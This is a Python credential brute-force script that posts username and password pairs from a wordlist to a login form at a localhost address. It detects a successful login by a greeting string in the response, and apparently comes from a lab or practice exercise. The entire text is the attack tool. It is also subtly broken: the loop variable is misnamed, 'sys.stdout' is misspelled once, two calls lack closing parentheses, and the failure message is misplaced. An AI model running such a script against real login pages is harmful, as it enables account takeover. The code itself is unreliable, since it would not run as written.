import requests 
import sys 

#define target IP, username and password lists. 
target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test", "kali", "root"]
passwords = "top-100.txt"
needle = "Yoooo! Nice to have you here"

#iterate through the users names with the password list
for username in usernames:
  with open(passwords, "r") as password_list: 
    for passwords in password_list:
      password = password.strip("\n").encode()
      sys.stdout.write("[X] Attempting user:password -> {} : {}\r".format(username, password.decode())
      sys.stdout.flush() 
      r = requests.post(target, data={"username": username, "password": password})
      if needle.encode() in r.content: 
        sys.stdout.write("\n")
        sys.atdout.write("\t[>>>>>] Valid Username and Password! '{}' : '{}'".format(username, password.decode())
        sys.exit()
      sys.stdout.flush()
      sys.stdout.write("\n")
      sys.stdout.write("\t No password found for '{}'".format(username)) 
        
